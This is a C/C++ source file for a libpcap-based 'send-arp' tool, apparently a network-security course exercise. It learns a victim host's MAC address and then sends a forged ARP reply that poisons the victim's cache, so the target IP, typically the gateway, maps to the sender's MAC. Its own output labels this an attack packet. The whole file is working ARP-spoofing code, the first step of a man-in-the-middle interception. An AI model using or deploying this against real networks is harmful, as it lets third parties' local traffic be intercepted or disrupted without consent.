#include <pcap.h>
#include <headers.h>
#include <sys/socket.h>
#include <sys/ioctl.h>
#include <linux/if.h>
#include <netdb.h>
#include <stdio.h>
#include <string.h>
#include <unistd.h>
#include <stdlib.h>

#define ARP 0X0806
#define Ethernet 0X0001
#define IPv4 0X0800
#define Request 0X0001
#define SIZE_IPADD 0x04
#define MAC_LEN 6

void usage() {
    printf("syntax: send-arp <interface> <sender ip> <target ip> \n");
    printf("sample: send-arp wlan0 192.168.10.2 192.168.10.1\n");
}

struct EtherArpPacket {
    Etherheader ether;
    ARPheader arp;
};

void get_mac(uint8_t smac[], char* dev)
{
    struct ifreq s;
    int fd = socket(PF_INET, SOCK_DGRAM, IPPROTO_IP);

    strcpy(s.ifr_name, dev);
    if (0 != ioctl(fd, SIOCGIFHWADDR, &s)) {
        printf("Can't get mac address");
    }
    int i;
    for (i=0;i<6;++i) {
        smac[i] = (unsigned char) s.ifr_addr.sa_data[i];
    }
}

char* get_ip(char* dev)
{
    int fd;
    struct ifreq ifr;

    fd = socket(AF_INET, SOCK_DGRAM, 0);

    ifr.ifr_addr.sa_family = AF_INET;

    strncpy(ifr.ifr_name, dev, IFNAMSIZ-1);

    if ( 0 != ioctl(fd, SIOCGIFADDR, &ifr)){
        printf("Can't get ip address");
    }

    close(fd);
    return inet_ntoa(((struct sockaddr_in *)&ifr.ifr_addr)->sin_addr);
}

void sendpacket(pcap_t* handle, EtherArpPacket* rqpacket) {
    int res = pcap_sendpacket(handle, reinterpret_cast<const u_char*>(rqpacket), sizeof(EtherArpPacket));
        if (res != 0) {
            fprintf(stderr, "pcap_sendpacket return %d error=%s\n", res, pcap_geterr(handle));
        }
}

int main(int argc, char* argv[]) {
    if (argc != 4) {
        usage();
        return -1;
    }

    char* dev = argv[1];
    char errbuf[PCAP_ERRBUF_SIZE];
    pcap_t* handle = pcap_open_live(dev, BUFSIZ, 1, 1000, errbuf);
    if (handle == nullptr) {
        fprintf(stderr, "couldn't open device %s(%s)\n", dev, errbuf);
        return -1;
    }

    EtherArpPacket rqpacket;
    char* sender_ip = argv[2];
    char* target_ip = argv[3];
    uint8_t broadmac[6] = {0xff, 0xff, 0xff, 0xff, 0xff, 0xff};
    uint8_t unknownmac[6] = {0x00, 0x00, 0x00, 0x00, 0x00, 0x00};

    memcpy(rqpacket.ether.dmac, broadmac, MAC_LEN);
    get_mac(rqpacket.ether.smac, dev);
    rqpacket.ether.etype = htons(ARP);

    rqpacket.arp.htype = htons(Ethernet);
    rqpacket.arp.ptype = htons(IPv4);
    rqpacket.arp.hal = sizeof(rqpacket.ether.dmac);
    rqpacket.arp.pal = SIZE_IPADD;
    rqpacket.arp.opcode = htons(Request);
    get_mac(rqpacket.arp.smac, dev);
    inet_pton(AF_INET, get_ip(dev), &rqpacket.arp.sip);
    memcpy(rqpacket.arp.tmac, unknownmac, MAC_LEN);
    inet_pton(AF_INET, sender_ip, &rqpacket.arp.tip);

    sendpacket(handle, &rqpacket);
    printf("success broadpacket\n\n");

    while (true) {
        struct pcap_pkthdr* header;
        const u_char* rppacket;

        int res = pcap_next_ex(handle, &header, &rppacket);
        if (res == 0) continue;
        if (res == -1 || res == -2) {
            printf("pcap_next_ex return %d(%s)\n", res, pcap_geterr(handle));
                       break;
            }
            const struct Etherheader* ethernet = (struct Etherheader*)(rppacket);
            if (ntohs(ethernet->etype) != ARP) continue;

            const struct ARPheader* arp = (struct ARPheader*)(rppacket + sizeof(Etherheader));
            if (ntohs(arp->opcode) ==0x0002 && arp->sip == rqpacket.arp.tip && arp->tip == rqpacket.arp.sip) {
                memcpy(rqpacket.ether.dmac, arp->smac, MAC_LEN);
                memcpy(rqpacket.arp.tmac, arp->smac, MAC_LEN);

                inet_pton(AF_INET, target_ip, &rqpacket.arp.sip);
            }

            sendpacket(handle, &rqpacket);
            printf("success attackpacket\n\n");

            break;
    }

    pcap_close(handle);
}

